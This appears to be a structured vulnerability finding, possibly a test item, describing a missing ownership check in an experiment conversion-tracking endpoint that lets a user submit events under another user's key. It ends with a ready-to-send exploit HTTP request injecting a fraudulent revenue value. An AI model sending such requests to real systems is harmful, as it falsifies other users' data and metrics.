diagnosis: The experiment conversion tracking handler dispatches metric events to LaunchDarkly using target_user_key submitted in the payload. Because it fails to ensure payload.target_user_key == str(current_user.id), an attacker can inject fraudulent conversion and revenue figures into other users' experiment cohorts.
exploit_request:
POST /experiments/checkout_ab_test_v2/conversion HTTP/1.1
Host: api.retailplatform.io
Authorization: Bearer <regular_user_token>
Content-Type: application/json

{"target_user_key": "usr_competitor_8812", "revenue_value": 99999.00}
